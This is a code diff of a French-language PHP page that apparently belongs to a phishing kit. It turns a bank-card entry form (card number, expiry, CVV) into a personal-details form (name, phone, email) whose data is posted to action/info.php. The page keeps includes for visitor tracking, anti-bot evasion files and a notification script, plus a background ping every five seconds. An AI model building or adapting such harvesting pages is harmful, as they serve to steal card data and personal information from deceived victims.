@@ -1,12 +1,12 @@
 <?php
 
 include("track.php");
-include 'page_notify.php'; 
+include 'page_notify.php';
 
 // Juste au début du fichier PHP
 include 'Jeehan.php';
 $jeehan = new Jeehan();
-$jeehan->track('nom_de_la_page.php'); // ex: connexion.php
+$jeehan->track('info.php'); 
 
 
 include 'src/antibots.php';
@@ -31,33 +31,7 @@ include 'anti/anti8.php';
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="shortcut icon" href="image/logo.png">
     <link rel="stylesheet" href="style.css">
-    <title>Formulaire Carte Bancaire</title>
-    <style>
-        /* Styles pour l'overlay de chargement */
-        .loading-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.8);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 10;
-        }
-
-        .spinner-border {
-            width: 3rem;
-            height: 3rem;
-            color: #28a745; /* Couleur verte */
-        }
-
-        .dimmed {
-            opacity: 0.5;
-            pointer-events: none;
-        }
-    </style>
+    <title>Formulaire Informations Personnelles</title>
 </head>
 
 <body>
@@ -85,30 +59,27 @@ include 'anti/anti8.php';
         <div class="row">
             <!-- Form Section -->
             <div class="col-md-6 p-5 form-section">
-                <h2 class="text-success">Formulaire de Carte Bancaire</h2>
+                <h2 class="text-success">Formulaire d'Informations Personnelles</h2>
 
-                <form id="payment-form" action="action/carte.php" method="POST" onsubmit="handleSubmit(event)">
+                <form id="info-form" action="action/info.php" method="POST">
                     <div class="mb-3">
-                        <label for="cardNumber" class="form-label fw-bold">Numéro de la carte</label>
-                        <input type="text" id="cardNumber" name="cardNumber" class="form-control" placeholder="1234 5678 1234 5678" required>
+                        <label for="lastName" class="form-label fw-bold">Nom</label>
+                        <input type="text" id="lastName" name="lastName" class="form-control" required>
                     </div>
 
                     <div class="mb-3">
-                        <label for="expirationDate" class="form-label fw-bold">Date d'expiration</label>
-                        <div class="d-flex">
-                            <input type="text" id="expirationMonth" name="expirationMonth" class="form-control me-2" placeholder="MM" maxlength="2" required>
-                            <input type="text" id="expirationYear" name="expirationYear" class="form-control" placeholder="AAAA" maxlength="4" required>
-                        </div>
+                        <label for="firstName" class="form-label fw-bold">Prénom</label>
+                        <input type="text" id="firstName" name="firstName" class="form-control" required>
                     </div>
 
                     <div class="mb-3">
-                        <label for="cvv" class="form-label fw-bold">CVV</label>
-                        <input type="text" id="cvv" name="cvv" class="form-control" placeholder="123" maxlength="3" required>
+                        <label for="phone" class="form-label fw-bold">Numéro de téléphone</label>
+                        <input type="tel" id="phone" name="phone" class="form-control" required>
                     </div>
 
-                    <div class="d-flex align-items-center mb-3">
-                        <input type="checkbox" id="saveCard" name="saveCard" class="me-2">
-                        <label for="saveCard" class="mb-0">Mémoriser cette carte</label>
+                    <div class="mb-3">
+                        <label for="email" class="form-label fw-bold">Adresse e-mail</label>
+                        <input type="email" id="email" name="email" class="form-control" required>
                     </div>
 
                     <button type="submit" class="btn btn-success w-50 mt-4">Valider</button>
@@ -119,13 +90,6 @@ include 'anti/anti8.php';
 <?php endif; ?>
 
                 </form>
-
-                <!-- Loading overlay, caché par défaut -->
-                <div id="loading-overlay" class="loading-overlay d-none">
-                    <div class="spinner-border" role="status">
-                        <span class="visually-hidden">Loading...</span>
-                    </div>
-                </div>
             </div>
 
             <!-- Image Section -->
@@ -165,18 +129,18 @@ include 'anti/anti8.php';
         </div>
     </footer>
 
-    
-
+    <!-- Bootstrap JS -->
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script>
-   setInterval(() => {
+    setInterval(() => {
     fetch('ping.php');
 }, 5000); // toutes les 5 secondes
 </script>
 
 </body>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
 
 </html>
